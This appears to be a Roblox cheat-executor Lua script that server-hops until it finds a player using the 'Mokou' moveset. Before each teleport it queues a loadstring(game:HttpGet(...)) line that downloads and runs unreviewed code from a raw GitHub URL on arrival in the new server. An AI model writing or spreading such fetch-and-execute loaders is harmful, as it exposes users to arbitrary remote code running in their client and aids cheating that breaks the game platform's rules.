
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

local PLACE_ID = game.PlaceId
local JOB_ID = game.JobId
local TARGET_MOVESET = "Mokou"

local function hasTarget()
    local chars = workspace:FindFirstChild("Characters")
    if not chars then return false end

    local playersFolder = chars:FindFirstChild("Oyuncular")
    if not playersFolder then return false end

    for _, model in ipairs(playersFolder:GetChildren()) do
        if model:IsA("Model") and model:GetAttribute("Moveset") == TARGET_MOVESET then
            return true
        end
    end

    return false
end

local function ServerHop()
    local servers = {}

    local success, req = pcall(function()
        return game:HttpGet(
            "https://games.roblox.com/v1/games/" .. PLACE_ID ..
            "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true"
        )
    end)

    if not success or not req then
        warn("Request failed")
        return
    end

    local body
    local decodeSuccess = pcall(function()
        body = HttpService:JSONDecode(req)
    end)

    if not decodeSuccess or not body or not body.data then
        warn("Invalid server data")
        return
    end

    for _, v in next, body.data do
        if type(v) == "table"
        and tonumber(v.playing)
        and tonumber(v.maxPlayers)
        and v.playing < v.maxPlayers
        and v.id ~= JOB_ID then

            table.insert(servers, v.id)
        end
    end

    if #servers > 0 then
        queue_on_teleport([[
            loadstring(game:HttpGet("https://raw.githubusercontent.com/phnnsecret-hash/Test/refs/heads/main/test"))()
        ]])

        TeleportService:TeleportToPlaceInstance(
            PLACE_ID,
            servers[math.random(1, #servers)],
            Players.LocalPlayer
        )
    else
        warn("Couldn't find a server.")
    end
end

while task.wait(3) do
    if hasTarget() then
        print("Mokou bulundu")
        break
    else
        ServerHop()
        break
    end
end
